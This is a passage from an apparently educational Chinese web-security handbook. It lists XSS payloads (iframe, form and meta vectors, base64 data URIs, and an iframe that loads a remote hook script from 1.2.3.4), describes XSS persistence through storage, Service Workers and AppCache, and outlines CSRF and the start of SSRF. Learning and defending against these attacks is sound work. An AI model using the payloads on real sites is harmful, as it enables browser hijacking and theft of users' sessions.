class="cm-string">(data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='iframe-2'><span>iframe</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>7</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">iframe</span> <span class="cm-attribute">onload</span>=<span class="cm-string">'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">var sc = document.createElement("scr" + "ipt");</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">sc.type = "text/javascr" + "ipt";</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">sc.src = "http://1.2.3.4/js/hook.js";</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">document.body.appendChild(sc);</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">/&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 159px;"></div><div class="CodeMirror-gutters" style="height: 159px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>11</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">iframe</span> <span class="cm-attribute">src</span>=<span class="cm-string">javascript:alert(1)</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">iframe</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">iframe</span> <span class="cm-attribute">src</span>=<span class="cm-string">"data:text/html,&lt;iframe src=javascript:alert('M')&gt;&lt;/iframe&gt;"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">iframe</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">iframe</span> <span class="cm-attribute">src</span>=<span class="cm-string">data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">iframe</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">iframe</span> <span class="cm-attribute">srcdoc</span>=<span class="cm-tag cm-error">&lt;svg/o</span><span class="cm-atom">&amp;#x6E;</span>load<span class="cm-atom">&amp;equals;</span>alert<span class="cm-atom">&amp;lpar;</span>1)<span class="cm-atom">&amp;gt;</span>&gt;<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag cm-error">iframe</span><span class="cm-tag cm-bracket cm-error">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">iframe</span> <span class="cm-attribute">src</span>=<span class="cm-string">https://baidu.com</span> <span class="cm-attribute">width</span>=<span class="cm-string">1366</span> <span class="cm-attribute">height</span>=<span class="cm-string">768</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">iframe</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">iframe</span> <span class="cm-attribute">src</span>=<span class="cm-string">javascript:alert(1)</span> <span class="cm-attribute">width</span>=<span class="cm-string">1366</span> <span class="cm-attribute">height</span>=<span class="cm-string">768</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">iframe</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 295px;"></div><div class="CodeMirror-gutters" style="height: 295px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h4 id='form'><span>form</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>9</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">form</span> <span class="cm-attribute">action</span>=<span class="cm-string">javascript:alert(1)</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">input</span> <span class="cm-attribute">type</span>=<span class="cm-string">submit</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">form</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">button</span> <span class="cm-attribute">formaction</span>=<span class="cm-string">javascript:alert(1)</span><span class="cm-tag cm-bracket">&gt;</span>M</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">form</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">input</span> <span class="cm-attribute">formaction</span>=<span class="cm-string">javascript:alert(1)</span> <span class="cm-attribute">type</span>=<span class="cm-string">submit</span> <span class="cm-attribute">value</span>=<span class="cm-string">M</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">form</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">input</span> <span class="cm-attribute">formaction</span>=<span class="cm-string">javascript:alert(1)</span> <span class="cm-attribute">type</span>=<span class="cm-string">image</span> <span class="cm-attribute">value</span>=<span class="cm-string">M</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; <span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">form</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">input</span> <span class="cm-attribute">formaction</span>=<span class="cm-string">javascript:alert(1)</span> <span class="cm-attribute">type</span>=<span class="cm-string">image</span> <span class="cm-attribute">src</span>=<span class="cm-string">1</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='meta'><span>meta</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">META</span> <span class="cm-attribute">HTTP-EQUIV</span>=<span class="cm-string">"Link"</span> <span class="cm-attribute">Content</span>=<span class="cm-string">"&lt;http://ha.ckers.org/xss.css&gt;;REL=stylesheet"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h3 id='4211--持久化'><span>4.2.11  持久化</span></h3><h4 id='基于存储'><span>基于存储</span></h4><blockquote><p><span>有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在 eval(data) 之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。</span></p><p><span>在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用 String.fromCharCode 来绕过。</span></p></blockquote><h4 id='service-worker'><span>Service Worker</span></h4><blockquote><p><span>Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。</span></p><p><span>在 Chrome 中，可通过 chrome://inspect/#service-workers 来查看 Service Worker 的状态，并进行停止。</span></p></blockquote><h4 id='appcache'><span>AppCache</span></h4><blockquote><p><span>在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。</span></p></blockquote><h3 id='4212--参考链接'><span>4.2.12  参考链接</span></h3><h4 id='wiki'><span>wiki</span></h4><ul><li><a href='https://github.com/UltimateHackers/AwesomeXSS'><span>AwesomeXSS</span></a></li><li><a href='https://w3c.github.io/webappsec-csp/'><span>w3c</span></a></li><li><a href='https://github.com/wisec/domxsswiki/wiki'><span>dom xss wiki</span></a></li><li><a href='https://content-security-policy.com/'><span>content-security-policy.com</span></a></li><li><a href='https://shubs.io/exploiting-markdown-syntax-and-telescope-persistent-xss-through-markdown-cve-2014-5144/'><span>markdwon xss</span></a></li><li><a href='https://brutelogic.com.br/blog/cheat-sheet/'><span>xss cheat sheet</span></a></li><li><a href='https://html5sec.org/'><span>html5 security cheatsheet</span></a></li><li><a href='https://www.netsparker.com/whitepaper-http-security-headers/'><span>http security headers</span></a></li><li><a href='https://github.com/cure53/XSSChallengeWiki/wiki'><span>XSSChallengeWiki</span></a></li></ul><h4 id='challenges'><span>Challenges</span></h4><ul><li><a href='https://xss-game.appspot.com/'><span>XSS Challenge By Google</span></a></li><li><a href='http://prompt.ml/0'><span>prompt to win</span></a></li></ul><h4 id='css-2'><span>CSS</span></h4><ul><li><a href='http://www.thespanner.co.uk/2014/03/21/rpo/'><span>rpo</span></a></li><li><a href='http://www.zjicmisa.org/index.php/archives/127/'><span>rpo 攻击初探</span></a></li><li><a href='https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html'><span>Reading Data via CSS</span></a></li><li><a href='http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html'><span>css based attack abusing unicode range</span></a></li><li><a href='https://speakerdeck.com/lmt_swallow/css-injection-plus-plus-ji-cun-shou-fa-falsegai-guan-todui-ce'><span>css injection</span></a></li><li><a href='https://blog.sheddow.xyz/css-timing-attack/'><span>css timing attack</span></a></li></ul><h4 id='同源策略'><span>同源策略</span></h4><ul><li><a href='https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy'><span>Same origin policy</span></a></li><li><a href='https://www.bedefended.com/papers/cors-security-guide'><span>cors security guide</span></a></li><li><a href='https://speakerdeck.com/shhnjk/logically-bypassing-browser-security-boundaries'><span>logically bypassing browser security boundaries</span></a></li></ul><h4 id='bypass-3'><span>bypass</span></h4><ul><li><a href='https://gist.github.com/JohannesHoppe/5612274'><span>666 lines of xss payload</span></a></li><li><a href='https://github.com/masatokinugawa/filterbypass'><span>xss auditor bypass</span></a></li><li><a href='https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html'><span>xss auditor bypass writeup</span></a></li><li><a href='https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs'><span>bypassing csp using polyglot jpegs</span></a></li><li><a href='https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/'><span>bypass xss filters using javascript global variables</span></a></li></ul><h4 id='持久化-1'><span>持久化</span></h4><ul><li><a href='http://drops.wooyun.org/web/10798'><span>变种 XSS 持久控制 by tig3r</span></a></li><li><a href='https://sakurity.com/blog/2015/08/13/middlekit.html'><span>Using Appcache and ServiceWorker for Evil</span></a></li></ul><h4 id='tricks-2'><span>Tricks</span></h4><ul><li><a href='https://github.com/etherdream/sw-sec'><span>Service Worker 安全探索</span></a></li><li><a href='https://github.com/EtherDream/web-frontend-magic'><span>前端黑魔法</span></a></li></ul><p>&nbsp;</p><h2 id='43--csrf'><span>4.3  CSRF</span></h2><h3 id='431--简介'><span>4.3.1  简介</span></h3><blockquote><p><span>跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为 CSRF，是一种对网站的恶意利用。尽管听起来像 XSS，但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。</span></p></blockquote><h3 id='432--分类'><span>4.3.2  分类</span></h3><h4 id='资源包含'><span>资源包含</span></h4><blockquote><p><span>资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如 </span><span>&lt;</span><span>image</span><span>&gt;</span><span>、</span><span>&lt;</span><span>audio</span><span>&gt;</span><span>、</span><span>&lt;</span><span>video</span><span>&gt;</span><span>、</span><span>&lt;</span><span>object</span><span>&gt;</span><span>、</span><span>&lt;</span><span>script</span><span>&gt;</span><span> 等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。</span></p><p><span>由于缺少对 Cookie 的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。</span></p></blockquote><h4 id='基于表单'><span>基于表单</span></h4><blockquote><p><span>通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单; 其包含一个 JavaScript 片段，强制受害者的浏览器提交。</span></p><p><span>该表单可以完全由隐藏的元素组成，以致受害者很难发现它。</span></p><p><span>如果处理 cookies 不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。</span></p></blockquote><h4 id='xmlhttprequest'><span>XMLHttpRequest</span></h4><blockquote><p><span>XMLHttpRequest 可能是最少看到的方式，由于许多现代 Web 应用程序依赖 XHR，许多应用花费大量的时间来构建和实现这一特定的对策。</span></p><p><span>基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR 仅限于攻击者托管自己的有效载荷的原始请求。</span></p><p><span>这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。</span></p></blockquote><h3 id='433--防御'><span>4.3.3  防御</span></h3><ul><li><span>通过 CSRF-token 或者验证码来检测用户提交</span></li><li><span>验证 Referer/Content-Type</span></li><li><span>对于用户修改删除等操作最好都使用 POST 操作</span></li><li><span>避免全站通用的 Cookie，严格设置 Cookie 的域</span></li></ul><h3 id='434--参考链接'><span>4.3.4  参考链接</span></h3><ul><li><a href='https://www.github.com/jrozner/csrf-demo'><span>demo</span></a></li><li><a href='https://medium.com/%40jrozner/wiping-out-csrf-ded97ae7e83f'><span>Wiping Out CSRF</span></a></li><li><a href='https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection'><span>Neat tricks to bypass CSRF protection</span></a></li></ul><p>&nbsp;</p><h2 id='44--ssrf'><span>4.4  SSRF</span></h2><h3 id='441--简介'><span>4.4.1  简介</span></h3><blockquote><p><span>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。</span></p></blockquote><h4 id='漏洞危害'><span>漏洞危害</span></h4><blockquote><p><span>SSRF 可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用 File 协议读取本地文件。</span></p><p><span>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在 SSRF 时，通常会造成较大的危害。</span></p></blockquote><h3 id='442--利用方式'><span>4.4.2  利用方式</span></h3><blockquote><p><span>SSRF 利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。</span></p><p><span>以 curl 为例, 可以使用 dict 协议操作 Redis、file 协议读文件、gopher 协议反弹 Shell 等功能，常见的 Payload</span></p><p><span>如下：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="shell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>9</div></div></div><div 